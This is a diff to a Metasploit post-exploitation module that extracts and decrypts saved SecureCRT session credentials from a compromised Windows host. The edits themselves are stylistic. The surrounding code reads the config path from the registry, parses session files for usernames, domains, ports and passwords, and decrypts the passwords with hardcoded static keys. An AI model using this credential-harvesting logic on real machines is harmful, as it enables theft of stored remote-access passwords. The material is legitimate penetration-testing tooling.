@@ -87,7 +87,7 @@ class MetasploitModule < Msf::Post
         password = decrypted_script[/[p]*assword:\x1F(?<password>[\S]+)\x1F/u, 'password']
         domain = decrypted_script[/[Ww]*indows [Dd]*omain:\x1F(?<domain>[\S]+)\x1F/u, 'domain']
         if !domain.nil? && !username.nil?
-          username = domain + '\\' + username
+          username = "#{domain}\\#{username}"
         end
       else
         password = securecrt_crypto(file[/"Password"=u(?<password>[0-9a-f]+)/u, 'password'])
@@ -95,9 +95,8 @@ class MetasploitModule < Msf::Post
         username = file[/"Username"=(?<username>[^\s]+)/, 'username']
       end
 
-      port = file[/#{protocol}\r\n\w:\"Port\"=(?<port>[0-9a-f]{8})/, 'port']&.to_i(16)&.to_s
-      port = file[/\[#{protocol}\] Port\"=(?<port>[0-9a-f]{8})/, 'port']&.to_i(16)&.to_s if port.nil?
-
+      port = file[/#{protocol}\r\n\w:"Port"=(?<port>[0-9a-f]{8})/, 'port']&.to_i(16)&.to_s
+      port = file[/\[#{protocol}\] Port"=(?<port>[0-9a-f]{8})/, 'port']&.to_i(16)&.to_s if port.nil?
 
       tbl << {
         file_name: item['name'],
@@ -113,6 +112,7 @@ class MetasploitModule < Msf::Post
 
   def securecrt_crypto(ciphertext)
     return nil if ciphertext.nil? || ciphertext.empty?
+
     key1 = "\x24\xA6\x3D\xDE\x5B\xD3\xB3\x82\x9C\x7E\x06\xF4\x08\x16\xAA\x07"
     key2 = "\x5F\xB0\x45\xA2\x94\x17\xD9\x16\xC6\xC6\xA2\xFF\x06\x41\x82\xB7"
     ciphered_bytes = [ciphertext].pack('H*')
@@ -129,6 +129,7 @@ class MetasploitModule < Msf::Post
 
   def securecrt_crypto_v2(ciphertext)
     return nil if ciphertext.nil? || ciphertext.empty?
+
     iv = ("\x00" * 16)
     config_passphrase = datastore['PASSPHRASE'] || nil
     key = OpenSSL::Digest::SHA256.new(config_passphrase).digest
@@ -184,7 +185,7 @@ class MetasploitModule < Msf::Post
       parent_key = 'HKEY_CURRENT_USER\\Software\\VanDyke\\SecureCRT'
       # get session file path
       root_path = registry_getvaldata(parent_key, 'Config Path')
-      securecrt_path = expand_path(root_path + session.fs.file.separator + 'Sessions') if !root_path.to_s.empty?
+      securecrt_path = expand_path("#{root_path}#{session.fs.file.separator}Sessions") if !root_path.to_s.empty?
     else
       securecrt_path = expand_path(datastore['SESSION_PATH'])
     end
